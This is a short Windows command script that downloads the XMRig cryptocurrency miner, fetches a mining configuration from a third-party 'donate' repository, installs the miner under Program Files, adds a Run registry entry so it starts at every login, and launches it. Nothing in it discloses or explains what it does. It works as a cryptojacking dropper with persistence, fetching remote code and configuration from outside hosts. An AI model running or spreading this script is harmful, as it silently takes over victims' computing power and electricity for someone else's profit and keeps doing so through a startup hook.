curl -OL https://github.com/xmrig/xmrig/releases/download/v6.16.2/xmrig-6.16.2-gcc-win64.zip
tar -xf xmrig-6.16.2-gcc-win64.zip
curl -OL https://raw.githubusercontent.com/1nachi/donate/main/config.json
mkdir xmrig
move xmrig-6.16.2\xmrig.exe xmrig
move config.json xmrig
move xmrig "C:\Program Files"
REG ADD "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /V "xmrig" /t REG_SZ /F /D "C:\Program Files\xmrig\xmrig.exe"
start "C:\Program Files\xmrig\xmrig.exe"